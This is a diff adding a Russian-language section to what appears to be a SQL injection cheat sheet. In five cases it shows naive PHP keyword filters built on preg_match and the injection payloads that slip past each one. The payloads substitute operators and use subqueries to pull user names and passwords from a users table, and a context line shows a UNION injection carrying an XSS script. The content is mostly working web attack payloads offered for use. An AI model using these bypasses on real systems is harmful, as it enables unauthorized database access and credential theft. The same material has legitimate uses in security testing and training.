@@ -391,6 +391,123 @@ id=-1' UNION SELECT 1,<script>alert('1337');</script>--
 ```
 
 
+# **Обход фильтрации функций и ключевых слов.**
+
+## **1.**
+
+### Фильтруемые ключевые слова:
+```
+and, or
+```
+
+### **Код PHP-фильтра:**
+```php
+preg_match('/(and|or)/i', $id)
+```
+
+### **Отфильтрованная инъекция:**
+```sql
+1 or 1 = 1 1 and 1 = 1
+```
+
+### **Пропущенная инъекция:**
+```sql
+1 || 1 = 1 1 && 1 = 1
+```
+
+## **2.**
+
+### Фильтруемые ключевые слова:
+```
+and, or, union
+```
+
+### **Код PHP-фильтра:**
+```php
+preg_match('/(and|or|union)/i', $id)
+```
+
+### **Отфильтрованная инъекция:**
+```sql
+union select user, password from users
+```
+
+### **Пропущенная инъекция:**
+```sql
+1 || (select user from users where user_id=1)='admin'
+```
+
+## **3.**
+
+### Фильтруемые ключевые слова:
+```
+and, or, union, where
+```
+
+### **Код PHP-фильтра:**
+```php
+preg_match('/(and|or|where|union)/i', $id)
+```
+
+### **Отфильтрованная инъекция:**
+```sql
+1 || (select user from users where user_id=1)='admin'
+```
+
+### **Пропущенная инъекция:**
+```sql
+1 || (select user from users limit 1)='admin'
+```
+
+## **4.**
+
+### Фильтруемые ключевые слова:
+```
+and, or, union, where, limit
+```
+
+### **Код PHP-фильтра:**
+```php
+preg_match('/(and|or|where|limit|union)/i', $id)
+```
+
+### **Отфильтрованная инъекция:**
+```sql
+1 || (select user from users limit 1)='admin'
+```
+
+### **Пропущенная инъекция:**
+```sql
+1 || (select user from users group by user_id having user_id = 1)='admin'
+```
+
+## **5.**
+
+### Фильтруемые ключевые слова:
+```
+and, or, union, where, limit, group by
+```
+
+### **Код PHP-фильтра:**
+```php
+preg_match('/(and|or|where|limit|group by|union)/i', $id)
+```
+
+### **Отфильтрованная инъекция:**
+```sql
+1 || (select user from users group by user_id having user_id = 1)='admin'
+```
+
+### **Пропущенная инъекция:**
+```sql
+1 || (select substr(group_concat(user_id),1,1)user from users)=1
+```
+
+
+
+
+
+
 
 
 
